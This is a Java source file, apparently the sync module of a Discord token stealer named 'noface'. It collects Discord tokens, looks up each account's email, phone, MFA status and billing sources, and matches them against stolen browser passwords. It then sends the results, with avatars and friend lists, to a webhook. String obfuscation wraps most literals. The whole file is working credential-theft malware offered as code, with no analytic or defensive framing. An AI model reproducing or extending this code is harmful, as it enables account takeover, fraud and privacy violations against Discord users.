package noface.sync;

import noface.api.Mem;
import noface.api.Send;
import noface.config.Hook;
import noface.config.Log;
import noface.config.S;

import java.net.URI;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;

public final class Pull {

    private static volatile List<String> tokens = List.of();
    private static volatile List<Info.Token> accounts = List.of();

    public record Stats(int tokens, int accounts) {}

    public static Stats run() throws Exception {
        Log.out(S.e("[*] sync"));
        List<String> found = Scan.all();
        tokens = found == null ? List.of() : List.copyOf(found);
        Log.out(S.e("[+] tokens=") + tokens.size());

        Store.save(tokens);

        StringBuilder log = new StringBuilder();
        log.append(S.e("tokens=")).append(tokens.size()).append('\n');

        int count = 0;
        Set<String> seen = new HashSet<>();
        List<Info.Token> enriched = new ArrayList<>();

        for (int i = 0; i < tokens.size(); i++) {
            try {
                if (i > 0) Thread.sleep(1500);
                Info.Token info = Info.enrich(tokens.get(i), S.e("Discord"));
                if (info == null) continue;
                if (info.id() == null || info.id().isEmpty()) continue;
                if (!seen.add(info.id())) continue;
                enriched.add(info);
            } catch (Exception ignored) {}
        }

        for (Info.Token info : enriched) {
            count++;
            Mem.put(S.e("discord/account_") + info.id() + ".json", accountJson(info));
        }

        accounts = List.copyOf(enriched);
        log.append("accounts=").append(count).append('\n');
        Log.out(S.e("[+] accounts=") + count);
        Mem.put(S.e("discord/summary.txt"), log.toString());
        return new Stats(tokens.size(), count);
    }

    public static void push(List<noface.browsers.Pass.Entry> entries) {
        if (!Hook.ready()) return;
        for (Info.Token info : accounts) {
            try {
                byte[] av = null;
                String avName = null;
                String mime = S.e("image/png");
                if (info.avatar() != null && !info.avatar().isEmpty()) {
                    av = Send.fetch(info.avatar());
                    if (av == null || av.length == 0) av = placeholder();
                    if (av != null && av.length > 0) {
                        boolean gif = info.avatar().contains(S.e(".gif"));
                        avName = UUID.randomUUID().toString().replace("-", "") + (gif ? S.e(".gif") : S.e(".png"));
                        mime = gif ? S.e("image/gif") : S.e("image/png");
                    }
                }
                String hit = noface.browsers.Pass.discord(entries, info.email(), info.user());
                if (avName != null) {
                    Send.hookFile(Embed.account(info, avName, hit), av, avName, mime);
                } else {
                    Send.hookJson(Embed.account(info, null, hit));
                }

                List<String> friends = Friends.embeds(info.raw(), info.user());
                Send.hookJsonBatch(friends, 0);
            } catch (Exception ignored) {}
        }
    }

    private static byte[] placeholder() {
        try {
            return URI.create(S.e("https://cdn.discordapp.com/embed/avatars/0.png")).toURL().openStream().readAllBytes();
        } catch (Exception e) {
            return new byte[0];
        }
    }

    public static List<String> tokenList() {
        return new ArrayList<>(tokens);
    }

    private static String accountJson(Info.Token t) {
        return "{\"user\":\"" + esc(t.user()) + "\",\"id\":\"" + esc(t.id())
                + "\",\"email\":\"" + esc(t.email()) + "\",\"phone\":\"" + esc(t.phone())
                + "\",\"mfa\":" + t.mfa() + ",\"billing\":" + t.billSources() + "}";
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private Pull() {}
}
